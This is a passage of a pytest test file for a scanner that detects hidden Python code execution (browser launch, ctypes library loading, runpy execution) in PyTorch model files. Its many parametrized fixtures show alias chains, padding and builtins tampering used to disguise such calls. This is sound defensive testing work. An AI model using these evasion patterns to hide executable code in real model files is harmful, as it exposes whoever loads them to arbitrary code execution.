        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert bounded_statement_calls < 20

    def test_scan_model_bounds_typed_member_handler_exception_resolution(self, monkeypatch: pytest.MonkeyPatch) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        handlers = b"try:\n    raise RuntimeError()\nexcept RuntimeError:\n    c.CDLL = print\n" * 300
        source = b"\x00\xffimport ctypes as c\n" + padding + handlers + b"loader = c.CDLL\nloader('safe')\n" + padding
        prefix_resolution_calls = 0
        real_resolver = jit_script_module._resolved_exception_name_before

        def counting_resolver(candidate: bytes, offset: int, exception_name: str) -> str | None:
            nonlocal prefix_resolution_calls
            prefix_resolution_calls += 1
            return real_resolver(candidate, offset, exception_name)

        monkeypatch.setattr(jit_script_module, "_resolved_exception_name_before", counting_resolver)

        detector.scan_model(source, "pytorch", "payload.bin")

        assert prefix_resolution_calls < 2

    @pytest.mark.parametrize(
        ("prefix", "initial_binding", "endpoint", "expected_pattern"),
        [
            (
                b"import webbrowser as wb\n",
                b"value_0 = wb.open\n",
                b"value_1999('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"value_0 = c.CDLL\n",
                b"value_1999('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"value_0 = c.cdll\n",
                b"value_1999.msvcrt\n",
                "Native library loading detected",
            ),
            (
                b"from webbrowser import open as value_0\n",
                b"",
                b"value_1999('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"from ctypes import CDLL as value_0\n",
                b"",
                b"value_1999('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"from ctypes import cdll as value_0\n",
                b"",
                b"value_1999.msvcrt\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_preserves_late_rule_identity_beyond_replay_budget(
        self, prefix: bytes, initial_binding: bytes, endpoint: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = initial_binding + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000)
        )
        source = b"\x00\xff" + prefix + padding + bindings + endpoint + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )
        assert not any(
            finding.type == "code_execution_pattern"
            and finding.pattern == "Dynamic module execution detected"
            and expected_pattern != "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_bounds_typed_proof_inference_for_repeated_late_member_bindings(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"".join(
            (f"wb.open = wb{' ' * (index + 1)}.open\nvalue_{index} = wb{' ' * (index + 1)}.open\n").encode()
            for index in range(500)
        )
        source = (
            b"\x00\xffimport webbrowser as wb\n"
            + padding
            + bindings
            + b"value_499('https://example.invalid')\n"
            + padding
        )
        resolver_calls = 0
        real_resolver = jit_script_module._resolve_alias_aware_high_risk_calls

        def counting_resolver(tree: ast.AST) -> set[tuple[str, str]]:
            nonlocal resolver_calls
            resolver_calls += 1
            return real_resolver(tree)

        monkeypatch.setattr(jit_script_module, "_resolve_alias_aware_high_risk_calls", counting_resolver)

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert resolver_calls <= jit_script_module._MAX_PRIORITY_ASSIGNMENT_PROBES + 10

    @pytest.mark.parametrize("shadow", [b"class runner:\n    pass\n", b"del runner\n"])
    def test_scan_model_preserves_definite_late_alias_shadow(self, shadow: bytes) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xfffrom runpy import run_path as runner\n" + padding + shadow + b"(runner)('safe')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_forwarded_late_class_shadow(self) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"runner = rp.run_path\nclass runner:\n    pass\nforward = runner\n(forward)('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("prefix_state", "late_state", "expect_finding"),
        [
            (b"", b"rp.run_path = print\n" + b"rp.run_module = print\n" * 8, False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"rp.run_path: object = original\n" + b"rp.run_module = print\n" * 8,
                True,
            ),
            (b"", b"del rp.run_path\n", False),
            (b"", b"rp.__dict__['run_path'] = print\n", False),
            (b"", b"vars(rp).update(run_path=print)\n", False),
            (b"", b"rp.__dict__.update({'other': print, 'run_path': print})\n", False),
            (b"", b"vars(rp).update(other=print, run_path=print)\n", False),
            (b"", b"rp.__dict__.update(**{'run_path': print})\n", False),
            (b"", b"dict.update(rp.__dict__, run_path=print)\n", False),
            (b"", b"overwrite = dict.update\noverwrite(rp.__dict__, run_path=print)\n", False),
            (
                b"",
                b"import builtins\noverwrite = builtins.dict.update\noverwrite(rp.__dict__, run_path=print)\n",
                False,
            ),
            (b"", b"import builtins as bi\nbi.dict.update(rp.__dict__, run_path=print)\n", False),
            (b"", b"ns = rp.__dict__\nns.update(run_path=print)\n", False),
            (b"", b"restore = vars(rp).update\nrestore(run_path=print)\n", False),
            (
                b"",
                b"import builtins\nnamespace_of = builtins.vars\nbuiltins.vars = lambda obj: {}\n"
                b"mapping = namespace_of(rp)\nrestore = mapping.update\nrestore(run_path=print)\n",
                False,
            ),
            (b"", b"\x00\xffns = rp.__dict__\nns.update(run_path=print)\n", False),
            (b"", b"\x00\xffrestore = vars(rp).update\nrestore(run_path=print)\n", False),
            (b"", b"mod = rp\nns = mod.__dict__\nns.update(run_path=print)\n", False),
            (b"", b"mod = rp\nrestore = vars(mod).update\nrestore(run_path=print)\n", False),
            (b"", b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\nrestore(run_path=print)\n", False),
            (
                b"",
                b"mod = rp\nmapping = mod.__dict__\nsecond = mapping\nrestore = second.update\n"
                b"restore(run_path=print)\n",
                False,
            ),
            (
                b"",
                b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\napply = restore\napply(run_path=print)\n",
                False,
            ),
            (b"", b"rp.__dict__['run' + '_path'] = print\n", False),
            (b"", b"rp.__dict__[\n    'run' + '_path'\n] = print\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"dict = Safe\ndict.update(rp.__dict__, run_path=original)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbi.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"real_dict = dict\ndict = Safe\ndict = real_dict\n"
                b"dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"real_dict = dict\ndict = Safe\ndict = real_dict\n"
                b"dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_dict = bi.dict\nbi.dict = Safe\nbi.dict = real_dict\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins as bi\nbi.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"if globals().get('enabled'):\n    dict = Safe\n"
                b"dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"rp.run_path = print\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nif globals().get('enabled'):\n    dict = Safe\n"
                b"dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nif globals().get('enabled'):\n    builtins.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"rp.run_path = print\nimport builtins\nclass Safe:\n    @staticmethod\n"
                b"    def update(*args, **kwargs):\n        pass\nif globals().get('enabled'):\n"
                b"    builtins.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"if globals().get('enabled'):\n    dict = Safe\n"
                b"dict.update(\n    rp.__dict__, run_path=print\n)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.__dict__['dict'] = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.__dict__.update(dict=Safe)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
                b"mapping.update(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nbuiltins.__dict__.update(\n"
                b"    dict=real\n)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\ngetattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\ngetattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ndef inert():\n    builtins.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars(bi).update(dict=Safe)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbi = builtins\nbi.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nclass Holder:\n    pass\nbi = Holder()\nbi.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"class Restore:\n    rp.run_path = original\n",
                True,
            ),
            (b"", b"class SafeState:\n    rp.run_path = print\n", False),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nclass Shadow:\n    builtins.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ngetattr = lambda *args: Safe\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ngetattr = lambda *args: Safe\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars = lambda obj: {}\nvars(builtins).update(dict=Safe)\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"restore = (\n    dict.update\n)\nrestore(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"import builtins\nrestore = getattr(builtins, 'dict').update\nrestore(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
                b"restore = mapping.update\nrestore(dict=real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"ns = rp.__dict__\nif globals().get('enabled'):\n    ns = {}\nns.update(run_path=print)\n",
                True,
            ),
            (
                b"",
                b"class Safe:\n    run_path = print\nmod = rp\n"
                b"if globals().get('enabled'):\n    mod = Safe\nmod.run_path = print\n",
                True,
            ),
            (
                b"",
                b"class SafeState:\n    apply = dict.update\n    apply(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ngetattr = lambda *args: Safe\n"
                b"if globals().get('enabled'):\n    getattr = builtins.getattr\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.getattr = lambda *args: Safe\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.getattr = lambda *args: Safe\n"
                b"getattr \\\n (builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nif globals().get('enabled'):\n    builtins.getattr = lambda *args: Safe\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.__dict__['getattr'] = lambda *args: Safe\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars(builtins)['getattr'] = lambda *args: Safe\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars(builtins).__setitem__('getattr', lambda *args: Safe)\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars(builtins).update(getattr=lambda *args: Safe)\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nbuiltins.vars = lambda obj: {}\n"
                b"vars(builtins).update(dict=real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
                b"builtins.getattr = real_getattr\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
                b"real_getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
                b"if globals().get('enabled'):\n    builtins.getattr = real_getattr\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
                b"enabled = True\nif globals().get('enabled'):\n    real_getattr = lambda *args: Safe\n"
                b"builtins.getattr = real_getattr\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_getattr = builtins.getattr\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_getattr = lambda *args: Safe\n"
                b"real_getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_dict = builtins.dict\nbuiltins.dict = Safe\n"
                b"real_vars = builtins.vars\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
                b"real_vars(builtins).update(dict=real_dict)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_dict = builtins.dict\nbuiltins.dict = Safe\n"
                b"real_vars = builtins.vars\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
                b"namespace = real_vars(builtins)\nnamespace.update(dict=real_dict)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\n"
                b"mapping = builtins.__dict__\nput = mapping.__setitem__\nput('dict', real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\n"
                b"real.__setitem__(builtins.__dict__, 'dict', real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nput = real.__setitem__\n"
                b"put(builtins.__dict__, 'dict', real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"setattr(rp, 'run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nrestore = builtins.setattr\nrestore(rp, 'run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"dict.__setitem__(rp.__dict__, 'run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"put = dict.__setitem__\nput(rp.__dict__, 'run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nnamespace = builtins.vars(rp)\nput = namespace.__setitem__\n"
                b"put('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nnamespace = builtins.vars(rp)\nput = namespace.__setitem__\n"
                b"relay = put\nrelay('run_path', original)\n",
                True,
            ),
            (b"", b"put = dict.__setitem__\nput(rp.__dict__, 'run_path', print)\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"mapping = rp.__dict__\nmapping |= {'run_path': original}\n",
                True,
            ),
            (b"", b"mapping = rp.__dict__\nmapping |= {'run_path': print}\n", False),
            (b"", b"mapping = rp.__dict__\nmapping['run_path'] = print\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"mapping = rp.__dict__\nmapping['run_path'] = original\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"rp.__dict__.update([('run_path', original)])\n",
                True,
            ),
            (b"", b"rp.__dict__.update([('run_path', print)])\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"mapping = rp.__dict__\nrestore = mapping.update\nrestore([('run_path', original)])\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"rp.__dict__.__ior__({'run_path': original})\n",
                True,
            ),
            (b"", b"rp.__dict__.__ior__({'run_path': print})\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"dict.__ior__(rp.__dict__, {'run_path': original})\n",
                True,
            ),
            (b"", b"dict.__ior__(rp.__dict__, {'run_path': print})\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"del rp.run_path\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (b"", b"del rp.run_path\nrp.__dict__.setdefault('run_path', print)\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"del rp.run_path\ndict.setdefault(rp.__dict__, 'run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"del rp.run_path\nput = rp.__dict__.setdefault\nput('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"del rp.__dict__['run_path']\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (b"", b"del rp.__dict__['run_path']\nrp.__dict__.setdefault('run_path', print)\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"rp.__dict__.pop('run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (b"", b"rp.__dict__.pop('run_path')\nrp.__dict__.setdefault('run_path', print)\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"del rp.run_path\nput = dict.setdefault\nput(rp.__dict__, 'run_path', original)\n",
                True,
            ),
            (b"", b"del rp.run_path\nput = dict.setdefault\nput(rp.__dict__, 'run_path', print)\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"del rp.run_path; rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"(rp.__dict__.pop('run_path'), rp.__dict__.setdefault('run_path', original))\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"dict.__delitem__(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"remove = rp.__dict__.pop\nremove('run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"remove = dict.pop\nremove(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"remove = dict.__delitem__\nremove(rp.__dict__, 'run_path')\n"
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"delattr(rp, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (b"", b"dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', print)\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"del rp.run_path\nrp.__dict__.setdefault('run_path', original)\n"
                b"runner = rp.run_path\nrunner('payload.py')\nrp.run_path = print\n",
                True,
            ),
            (
                b"",
                b"rp.run_path = print\nrp.__dict__.setdefault('run_path', original)\n",
                False,
            ),
            (
                b"",
                b"import builtins\nnamespace_of = builtins.vars\nenabled = True\n"
                b"if globals().get('enabled'):\n    namespace_of = lambda obj: {}\n"
                b"mapping = namespace_of(rp)\nmapping.update(run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nnamespace_of = builtins.vars\nenabled = True\n"
                b"if globals().get('enabled'):\n    namespace_of = lambda obj: {}\n"
                b"mapping = namespace_of(rp)\nrestore = mapping.update\nrestore(run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nnamespace_of = builtins.vars\nenabled = True\n"
                b"if globals().get('enabled'):\n    namespace_of = lambda obj: {}\n"
                b"mapping = namespace_of(rp)\nsecond = mapping\nsecond.update(run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nread_descriptor = builtins.getattr\nenabled = True\n"
                b"if globals().get('enabled'):\n    read_descriptor = lambda *args: Safe\n"
                b"restore = read_descriptor(builtins, 'dict').update\n"
                b"restore(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nread_descriptor = builtins.getattr\nenabled = True\n"
                b"if globals().get('enabled'):\n    read_descriptor = lambda *args: Safe\n"
                b"restore = read_descriptor(builtins, 'dict').update\napply = restore\n"
                b"apply(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.getattr = lambda *args: Safe\nbuiltins.getattr = getattr\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ngetattr = lambda *args: Safe\ndel getattr\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars = lambda obj: {}\ndel vars\nvars(builtins).update(dict=Safe)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (b"", b"if False:\n    dict = object\ndict.update(rp.__dict__, run_path=print)\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"if False:\n    dict = object\ndict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\ndict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\nremove = dict.pop\nremove(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"import builtins\noriginal = rp.run_path\nrp.run_path = print\nremove = builtins.dict.pop\n"
                b"remove(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"import builtins as bi\noriginal = rp.run_path\nrp.run_path = print\n"
                b"bi.dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
                b"import builtins\noriginal = rp.run_path\nrp.run_path = print\n"
                b"real_dict = builtins.dict\nreal_dict.pop(rp.__dict__, 'run_path')\n",
                b"rp.__dict__.setdefault('run_path', original)\n",
                True,
            ),
            (
